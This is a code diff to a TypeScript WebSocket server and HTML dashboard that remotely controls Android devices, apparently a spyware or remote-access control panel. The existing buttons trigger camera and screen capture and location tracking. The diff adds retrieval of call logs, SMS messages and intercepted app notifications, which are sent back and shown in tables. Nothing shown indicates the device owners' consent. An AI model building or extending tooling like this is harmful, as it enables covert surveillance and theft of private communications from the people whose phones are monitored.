@@ -36,6 +36,7 @@ interface DeviceInfo {
   lastCapturedPhoto?: string;
   screenCaptureActive?: boolean;
   lastCapturedScreen?: string;
+  notifications?: Array<Record<string, unknown>>;
 }
 
 interface ExtWebSocket extends WebSocket {
@@ -96,6 +97,10 @@ const DASHBOARD_HTML = `<!DOCTYPE html>
     .modal-backdrop.active { display: flex; }
     .modal-content { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 20px; max-width: 90vw; max-height: 90vh; text-align: center; }
     .modal-content img { max-width: 100%; max-height: 70vh; border-radius: 8px; border: 1px solid #0f172a; object-fit: contain; }
+    #recordsBody { max-height: 65vh; overflow: auto; text-align: left; }
+    .records-table { width: 100%; border-collapse: collapse; font-size: 12px; }
+    .records-table th, .records-table td { border: 1px solid #334155; padding: 8px; vertical-align: top; text-align: left; overflow-wrap: anywhere; }
+    .records-table th { position: sticky; top: 0; background: #0f172a; color: #7dd3fc; }
   </style>
 </head>
 <body>
@@ -124,12 +129,23 @@ const DASHBOARD_HTML = `<!DOCTYPE html>
     </div>
   </div>
 
+  <div class="modal-backdrop" id="recordsModal" onclick="closeRecordsModal()">
+    <div class="modal-content" onclick="event.stopPropagation()" style="max-width: 96vw; width: 900px; text-align: left;">
+      <h3 id="recordsTitle" style="margin-top: 0; color: #f8fafc; font-size: 16px;"></h3>
+      <div id="recordsBody"></div>
+      <div style="margin-top: 14px; text-align: right;">
+        <button onclick="closeRecordsModal()" style="background: #475569;">Close</button>
+      </div>
+    </div>
+  </div>
+
   <script>
     const protocol = window.location.protocol === "https:" ? "wss://" : "ws://";
     const ws = new WebSocket(protocol + window.location.host);
     const deviceListEl = document.getElementById("deviceList");
     const deckStatusEl = document.getElementById("deckStatus");
     const activityLogEl = document.getElementById("activityLog");
+    const notificationsByDevice = new Map();
 
     function logEvent(text) {
       const line = document.createElement("div");
@@ -149,6 +165,57 @@ const DASHBOARD_HTML = `<!DOCTYPE html>
 
     function closePhotoModal() {
       document.getElementById("photoModal").classList.remove("active");
+    }
+
+    function closeRecordsModal() {
+      document.getElementById("recordsModal").classList.remove("active");
+    }
+
+    function showRecordsModal(title, records) {
+      document.getElementById("recordsTitle").textContent = title;
+      const body = document.getElementById("recordsBody");
+      body.replaceChildren();
+
+      if (!Array.isArray(records) || records.length === 0) {
+        const empty = document.createElement("div");
+        empty.style.color = "#94a3b8";
+        empty.textContent = "No records available.";
+        body.appendChild(empty);
+      } else {
+        const columns = [...new Set(records.flatMap(record => Object.keys(record || {})))];
+        const table = document.createElement("table");
+        table.className = "records-table";
+        const head = table.createTHead().insertRow();
+        columns.forEach(key => {
+          const cell = document.createElement("th");
+          cell.textContent = key;
+          head.appendChild(cell);
+        });
+        const tableBody = table.createTBody();
+        records.forEach(record => {
+          const row = tableBody.insertRow();
+          columns.forEach(key => {
+            const cell = row.insertCell();
+            const value = record ? record[key] : "";
+            if ((key === "date" || key === "timestamp") && Number.isFinite(Number(value)) && Number(value) > 0) {
+              cell.textContent = new Date(Number(value)).toLocaleString();
+            } else if (key === "duration" && Number.isFinite(Number(value))) {
+              cell.textContent = Number(value) + " sec";
+            } else if (key === "read" && typeof value === "boolean") {
+              cell.textContent = value ? "Read" : "Unread";
+            } else {
+              cell.textContent = value == null ? "" : (typeof value === "object" ? JSON.stringify(value) : String(value));
+            }
+          });
+        });
+        body.appendChild(table);
+      }
+
+      document.getElementById("recordsModal").classList.add("active");
+    }
+
+    function showDeviceNotifications(deviceId) {
+      showRecordsModal("Notifications — " + deviceId.slice(0, 8), notificationsByDevice.get(deviceId) || []);
     }
 
     ws.onopen = () => {
@@ -172,7 +239,12 @@ const DASHBOARD_HTML = `<!DOCTYPE html>
       if (msg.type === "DEVICE_UPDATE") {
         renderDevices(msg.devices);
       } else if (msg.type === "ACTIVITY") {
-        logEvent(msg.message);
+        // Screenshot status, completion, and error events are also
+        // delivered with dedicated message types below. Avoid logging
+        // their generic ACTIVITY mirror a second time.
+        if (!String(msg.message || "").startsWith("Screen capture ")) {
+          logEvent(msg.message);
+        }
       } else if (msg.type === "PHOTO_RECEIVED") {
         logEvent("Captured photo received from " + msg.deviceId.slice(0, 8) + " (" + msg.lens + ")");
         showPhotoModal("Capture (" + msg.lens + ") - " + msg.deviceId.slice(0, 8), msg.image);
@@ -186,6 +258,23 @@ const DASHBOARD_HTML = `<!DOCTYPE html>
         logEvent("Screen capture " + (msg.active ? "started" : "stopped") + " on " + msg.deviceId.slice(0, 8));
       } else if (msg.type === "SCREENSHOT_ERROR") {
         logEvent("Screen capture error from " + msg.deviceId.slice(0, 8) + ": " + msg.error);
+      } else if (msg.type === "CALL_LOG_DATA") {
+        showRecordsModal("Call Logs — " + msg.deviceId.slice(0, 8), msg.entries || []);
+      } else if (msg.type === "SMS_DATA") {
+        showRecordsModal("SMS — " + msg.deviceId.slice(0, 8), msg.entries || []);
+      } else if (msg.type === "NOTIFICATION_DATA") {
+        const records = notificationsByDevice.get(msg.deviceId) || [];
+        const notification = msg.notification || {};
+        const alreadyCached = records.some(record =>
+          record.id === notification.id &&
+          record.package === notification.package &&
+          record.timestamp === notification.timestamp
+        );
+        if (!alreadyCached) {
+          records.unshift(notification);
+          notificationsByDevice.set(msg.deviceId, records.slice(0, 50));
+        }
+        logEvent("Notification from " + (notification.package || "app") + ": " + (notification.title || notification.text || "New notification"));
       }
     };
 
@@ -211,6 +300,9 @@ const DASHBOARD_HTML = `<!DOCTYPE html>
       }
 
       deviceListEl.innerHTML = devices.map(d => {
+        if (Array.isArray(d.notifications)) {
+          notificationsByDevice.set(d.id, d.notifications);
+        }
         const batteryStr = d.batteryLevel !== undefined 
           ? d.batteryLevel + "%" + (d.isCharging ? " (Charging)" : "") 
           : "Unknown";
@@ -263,6 +355,9 @@ const DASHBOARD_HTML = `<!DOCTYPE html>
               <button class="cam" onclick="sendCommand('\${d.id}', 'CAPTURE_PHOTO_FRONT')">🤳 Front Cam</button>
               <button class="tele" onclick="sendCommand('\${d.id}', 'GET_TELEMETRY')">Sync Telemetry</button>
               <button class="locate" onclick="sendCommand('\${d.id}', 'GET_LOCATION')">Locate</button>
+              <button onclick="sendCommand('\${d.id}', 'GET_CALL_LOG')">Call Logs</button>
+              <button onclick="sendCommand('\${d.id}', 'GET_SMS')">SMS</button>
+              <button onclick="showDeviceNotifications('\${d.id}')">Notifications (\${(d.notifications || []).length})</button>
               <button onclick="sendCommand('\${d.id}', 'PING')">Ping</button>
               <button onclick="sendCommand('\${d.id}', 'VIBRATE')">Vibrate</button>
               <button onclick="sendCommand('\${d.id}', 'TORCH_ON')">Torch ON</button>
@@ -520,6 +615,52 @@ wss.on("connection", (socket: WebSocket) => {
         broadcastToDashboards({
           type: "ACTIVITY",
           message: `Location received from ${devId.slice(0, 8)}: ${parsed.latitude.toFixed(4)}, ${parsed.longitude.toFixed(4)}`,
+        });
+        return;
+      }
+
+      if (parsed.type === "CALL_LOG_DATA" && extWs.deviceId) {
+        broadcastToDashboards({
+          type: "CALL_LOG_DATA",
+          deviceId: extWs.deviceId,
+          entries: Array.isArray(parsed.entries) ? parsed.entries : [],
+        });
+        return;
+      }
+
+      if (parsed.type === "SMS_DATA" && extWs.deviceId) {
+        broadcastToDashboards({
+          type: "SMS_DATA",
+          deviceId: extWs.deviceId,
+          entries: Array.isArray(parsed.entries) ? parsed.entries : [],
+        });
+        return;
+      }
+
+      if (parsed.type === "NOTIFICATION_DATA" && extWs.deviceId) {
+        const devId = extWs.deviceId;
+        const notification =
+          parsed.notification && typeof parsed.notification === "object"
+            ? parsed.notification as Record<string, unknown>
+            : {};
+        const current = deviceRegistry.get(devId) || {
+          manufacturer: "Unknown",
+          model: "Device",
+          androidVersion: "?",
+          sdkInt: 0,
+        };
+
+        current.notifications = [
+          notification,
+          ...(current.notifications || []),
+        ].slice(0, 50);
+        deviceRegistry.set(devId, current);
+        pushDeviceListUpdate();
+
+        broadcastToDashboards({
+          type: "NOTIFICATION_DATA",
+          deviceId: devId,
+          notification,
         });
         return;
       }
